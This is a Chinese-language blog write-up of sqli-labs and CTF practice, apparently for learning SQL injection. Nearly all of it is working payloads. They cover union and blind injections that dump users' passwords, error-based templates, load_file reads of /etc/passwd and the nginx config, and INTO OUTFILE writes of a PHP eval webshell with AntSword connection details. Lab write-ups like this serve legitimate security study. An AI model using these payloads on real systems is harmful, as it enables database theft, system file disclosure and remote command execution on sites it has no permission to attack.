---
title: sqli1-10练习
date: 2024-11-24 17:12:33
categories: SQL
tags: sql
updated: 2024-11-24 17:12:33
---
# sqli开头简介
sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！

# 前置知识点
联合查询特点：
1、要求多条查询语句的查询列数是一致的！   
2、要求多条查询语句的查询的每一列的类型和顺序最好一致  
3、union关键字默认去重，如果使用union all 可以包含重复项  

version():查看数据库版本
database():查看使用的数据库
user():查看当前用户
limit:limit子句分批来获取所有数据
group_concat():一次性获取所有的数据库信息

information_schema.tables:包含了数据库里所有的表
table_name:表名
table_schema:数据库名
column_name:字段名

--dbs:是查看所有的数据库
--tables:是查看所有的表
--columns:是查看表中所有的字段名
--dump:是查询哪个表的数据

# 联合注入
## 手工注入
1. 首先我们输入1，发现返回正常输入?id=1'，返回错误，说明存在单引号注入
![](https://gitee.com/fogpost/photo/raw/master/202410060247359.png)
2. 输入?id=1' and '1'='1，页面回显正常
![](https://gitee.com/fogpost/photo/raw/master/202410060248949.png)
3. 构造?id=1' and '1'='1' order by 1--+　　页面回显正常  
?id=1' and '1'='1' order by 2--+　　页面回显正常  
?id=1' and '1'='1' order by 3--+　　页面回显正常  
?id=1' and '1'='1' order by 4--+　　出现报错界面
![](https://gitee.com/fogpost/photo/raw/master/202410060250107.png)  
所以我们了解到了数据库表只有三列，确定了字段数
3. 构造联合查询?id=-1' union select 1,2,3--+前面的id为-1，使前面的语句无效，用union查询是否有回显，发现2和3有回显
![](https://gitee.com/fogpost/photo/raw/master/202410060254643.png)
4. 构造?id=-1' union select 1,database(),version()--+发现回显了数据库名称和版本信息
![](https://gitee.com/fogpost/photo/raw/master/202410060256922.png)
5. 构造?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+发现回显了数据库中的表名
![](https://gitee.com/fogpost/photo/raw/master/202410060259924.png)
5. 查询users的字段名?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+
![](https://gitee.com/fogpost/photo/raw/master/202410060302469.png)
6. 查询users表中的内容-1' union select 1,2,group_concat(0x5c,username,0x5c,password) from users --+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容
这个是手工注入的基本，大部分的注入都是围绕上面来优化的


## sqlmap注入
sqlmap -u http://sql/sqli-labs-master/Less-1/id=1 --dbs 查看对应的库
之后还会专门出一个sqlmap的教程，这里就不多说了

# bool盲注
?id=1'and length((select database()))>9--+
#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
?id=1'and ascii(substr((select database()),1,1))=115--+
#substr("78909",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
 
?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+
判断所有表名字符长度。
?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
逐一判断表名
 
?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+
判断所有字段名的长度
?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
逐一判断字段名。
 
 
?id=1' and length((select group_concat(username,password) from users))>109--+
判断字段内容长度
?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
逐一检测内容。

## 双查询注入
[参考文献](https://blog.csdn.net/xiayun1995/article/details/86512290)
在了解了bool盲注的基本原理之后我们发现一个问题，手工注入必然会导致时间过程，于是应运而生，我们的双查询注入可以帮助我们避免长时间的枯燥操作直接获取数据库的信息，在讲解之前我们要先了解几个函数

### 函数
rand()：随机数函数 返回一个0到1的数  
![](https://gitee.com/fogpost/photo/raw/master/202411241656811.png)  
floor()：向下取整，floor的向下取整可以帮我们进行去整处理，加入乘法便可以构建任意随机数选择
![](https://gitee.com/fogpost/photo/raw/master/202411241658373.png)  
concat()：字符串连接函数，用于连接我们查询到的数据
![](https://gitee.com/fogpost/photo/raw/master/202411241701358.png)
group by：分组 as (_*别名)：给查询结果起别名(括号中为自定义的别名)
![](https://gitee.com/fogpost/photo/raw/master/202411241707695.png)
count()：聚合函数
这里利用count(*)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来
![](https://gitee.com/fogpost/photo/raw/master/202411241709101.png)
我们这里需要的是第一次的报错，因为在实际过程中我们不可能查询到正确消息，只有在可能遇到错误时才会有返回值

### 子查询
子查询：内部查询，允许把另一个查询嵌套到当前的查询中
>MariaDB [dvwa]> SELECT concat("test: ",(select database())) as a;
![](https://gitee.com/fogpost/photo/raw/master/202411241654803.png)
操作开始便会先查询(select database())，然后将查询结果与"test: "连接起来，最后返回结果。

在注入的过程中我们不了解库名库表，可以借用information_schema的库来猜测，其中information_schema.schemata中包含了mysql的所有库名，information_schema.tables中包含了所有的表名，information_schema.columns中包含了所有的列名
![](https://gitee.com/fogpost/photo/raw/master/202411241703198.png)

### 报错注入模板
- select 1/0
- select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a
- extractvalue(1, concat(0x5c,(select user())))
- updatexml(0x3a,concat(1,(select user())),1)
- exp(~(SELECT * from(select user())a))
- ST_LatFromGeoHash((select * from(select * from(select user())a)b))
- GTID_SUBSET(version(), 1)


# 时间盲注
?id=1' and if(1=1,sleep(5),1)--+
判断参数构造。
?id=1'and if(length((select database()))>9,sleep(5),1)--+
判断数据库名长度
 
?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
逐一判断数据库字符
?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
判断所有表名长度
 
?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
逐一判断表名
?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
判断所有字段名的长度
 
?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
逐一判断字段名。
?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
判断字段内容长度
 
?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
逐一检测内容。


# 通过sql来getshell
## 条件和原理
>条件：  
 root权限  
 知道网站根目录绝对路径  
 secure_file_priv为空或指定目录（@@secure_file_priv参数可以其值）  
 gpc关闭  
原理：  
 写入webshell，通过参数执行系统命令，结束后删除webshell  
附：sqlserver getshell条件和原理  
 条件：  
  支持外连 
  有sa权限   
 原理：  
  开启xp_cmd扩展执行系统命令  

## 读写文件
>?id=-1)))))) union select load_file('/etc/passwd'),2%23
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin

## 读取nginx配置文件，寻找网站根目录
>?id=-1)))))) union select load_file('/etc/nginx/nginx.conf'),2%23  
Array ( [0] => Array ( [username] => daemon off; worker_processes auto; error_log /var/log/nginx/error.log warn; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root /var/www/html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location / { try_files $uri $uri/ /index.php?$args; } location ~ \.php$ { try_files $uri =404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } } [password] => 2 ) )
```php
Array
(
    [0] => Array
        (
            [username] => daemon off;

worker_processes  auto;

error_log  /var/log/nginx/error.log warn;

events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;

    server {
        listen       80;
        server_name  localhost;
        root         /var/www/html;
        index index.php;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        location / {
            try_files $uri  $uri/ /index.php?$args;
        }

        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            include        fastcgi_params;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        }

    }
}
            [password] => 2
        )

)
```

## 写入php探针:
>?id=-1)))))) union select '<?php phpinfo();?>',2 into outfile '/var/www/html/info.php'%23  
http://node6.anna.nssctf.cn:28413/info.php

## 写入webshell
>?id=-1)))))) union select '<?php eval($_POST["cc"]);?>',2 into outfile '/var/www/html/cc.php'%23
蚁剑连接：http://node6.anna.nssctf.cn:28413/cc.php 密码cc